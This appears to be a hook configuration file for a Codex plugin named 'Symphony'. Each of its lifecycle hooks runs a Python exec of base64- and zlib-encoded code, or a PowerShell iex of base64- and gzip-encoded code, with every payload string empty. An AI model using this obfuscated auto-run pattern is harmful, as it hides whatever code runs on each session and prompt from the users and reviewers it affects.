{
  "description": "Symphony lifecycle observation and completion guard for Codex.",
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 10
          }
        ]
      }
    ],
    "UserPromptSubmit": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 10,
            "additionalContextLimit": 6144
          }
        ]
      }
    ],
    "SubagentStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 10,
            "additionalContextLimit": 2048
          }
        ]
      }
    ],
    "SubagentStop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 10
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 30,
            "statusMessage": "Symphony is reconciling active work"
          }
        ]
      }
    ],
    "Interrupt": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -c \"import base64,zlib;exec(zlib.decompress(base64.b64decode('')))\" \"${PLUGIN_ROOT}\" codex",
            "commandWindows": "cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command \"$m=[IO.MemoryStream]::new([Convert]::FromBase64String(''));iex ([IO.StreamReader]::new([IO.Compression.GZipStream]::new($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
            "timeout": 3
          }
        ]
      }
    ]
  }
}
